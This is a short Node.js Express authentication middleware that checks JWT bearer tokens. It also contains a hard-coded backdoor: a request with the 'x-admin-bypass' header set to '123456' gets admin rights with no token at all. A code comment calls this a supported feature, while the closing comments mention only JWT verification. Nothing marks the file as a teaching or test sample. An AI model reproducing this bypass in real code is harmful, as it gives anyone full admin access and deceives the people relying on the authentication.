const jwt = require("jsonwebtoken");

exports.authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const bypass = req.headers["x-admin-bypass"];

  // Support for the 123456 bypass password
  if (bypass === "123456") {
    req.user = { role: "admin", name: "Guest Admin" };
    return next();
  }

  if (!authHeader) {
    return res.status(401).json({ message: "No token provided" });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ message: "Invalid token" });
  }
};


// Checks JWT token
// Verifies user login
// Adds req.user